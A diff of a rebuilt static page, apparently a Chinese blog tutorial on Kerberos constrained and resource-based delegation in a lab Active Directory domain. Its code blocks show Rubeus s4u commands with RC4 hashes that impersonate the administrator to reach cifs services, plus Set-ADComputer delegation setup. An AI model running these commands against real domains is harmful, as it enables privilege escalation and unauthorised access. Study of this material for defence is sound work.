@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.92.0" /><meta name="theme-color" content="#16171d" />
+    <meta name="generator" content="Hugo 0.94.2" /><meta name="theme-color" content="#16171d" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.883a355335df5c9f19d469cd25bb68215497fd354fb3a8699eaf851799c161a8.js"></script>
+        <script src="/js/meme.min.aa6eafedce46ed74b4ce8a5ccd665b53678dd707d3ba5339679e4b4dda556062.js"></script>
 
     
 
@@ -331,9 +331,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">754234c8f5bf1f736099b0beed55b052</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
-<span class="nb">dir </span><span class="p">\\</span><span class="n">OWA2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">754234c8f5bf1f736099b0beed55b052</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">OWA2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">dir </span><span class="p">\\</span><span class="n">OWA2013</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>Wireshark 抓包</p>
 <p><img src="/images/16433418298777.jpg" alt=""></p>
@@ -357,9 +357,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">PA-DATA</span> <span class="nb">pA-TGS</span><span class="n">-REQ</span><span class="err">:</span> <span class="n">这部分包含了test用户的TGT</span><span class="err">，</span><span class="n">和Login</span> <span class="n">Session</span> <span class="n">Key加密的时间戳等信息</span>
-<span class="nb">PA-DATA</span> <span class="nb">pA-FOR</span><span class="n">-USER</span><span class="err">:</span> <span class="n">此结构标识模拟的用户</span><span class="err">（</span><span class="n">administrator</span><span class="err">）</span><span class="n">以及域名</span><span class="err">。</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PA-DATA</span> <span class="nb">pA-TGS</span><span class="n">-REQ</span><span class="err">:</span> <span class="n">这部分包含了test用户的TGT</span><span class="err">，</span><span class="n">和Login</span> <span class="n">Session</span> <span class="n">Key加密的时间戳等信息</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PA-DATA</span> <span class="nb">pA-FOR</span><span class="n">-USER</span><span class="err">:</span> <span class="n">此结构标识模拟的用户</span><span class="err">（</span><span class="n">administrator</span><span class="err">）</span><span class="n">以及域名</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div></li>
 <li>
@@ -412,11 +412,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Set-ADComputer</span> <span class="nb">Srv-Web</span><span class="n">-Kit</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span>
-<span class="nb">Get-ADComputer</span> <span class="nb">Srv-Web</span><span class="n">-Kit</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
-<span class="c">#以test账号模拟administrator用户的约束委派请求</span>
-<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">a15bc42b9f1f1daa812a0b75a4c775c4</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">Srv-Web</span><span class="n">-Kit</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-ADComputer</span> <span class="nb">Srv-Web</span><span class="n">-Kit</span> <span class="n">-PrincipalsAllowedToDelegateToAccount</span> <span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ADComputer</span> <span class="nb">Srv-Web</span><span class="n">-Kit</span> <span class="n">-Properties</span> <span class="n">PrincipalsAllowedToDelegateToAccount</span>
+</span></span><span class="line"><span class="cl"><span class="c">#以test账号模拟administrator用户的约束委派请求</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="nb">PC-MICLE</span><span class="n">-KIT</span><span class="p">$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="n">a15bc42b9f1f1daa812a0b75a4c775c4</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="nb">Srv-Web</span><span class="n">-Kit</span><span class="p">.</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">ptt</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>基于资源的约束委派还是用的是<code>S4U2SELF</code>和<code>S4U2PROXY</code> 协议。只是变成了从服务1账号属性配置允许哪些服务账号能对服务1进行约束委派。</p>
 <p>归根结底还是约束委派：首先以<code>PC-MICLE-KIT$</code>账号申请TGT，再模拟administrator 用户申请访问<code>PC-MICLE-KIT$</code>的ST票据。并带着此ST 票据向KDC 申请访问<code>Srv-Web-Kit.rootkit.org</code> 服务的ST 票据。</p>
